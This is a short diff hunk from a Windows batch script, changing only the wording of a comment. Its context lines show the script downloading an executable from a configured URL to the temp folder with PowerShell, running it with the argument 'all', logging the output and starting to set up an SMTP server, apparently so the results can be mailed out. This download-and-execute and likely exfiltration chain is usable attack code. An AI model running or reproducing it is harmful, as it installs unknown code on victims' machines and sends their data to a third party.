@@ -8,7 +8,7 @@ set exeFile=%TEMP%\proc.exe
 set logFile=%TEMP%\proclog.txt
 set args=all
 
-:: Downloading and executing the file, while saving the logs.
+:: Downloading and executing the file, and saving the logs.
 powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%'); %exeFile% %args% > %logFile%
 
 :: Setting up the mail server (You can choose Google's, smtp2go, sendBlaster 4, or anyother method).
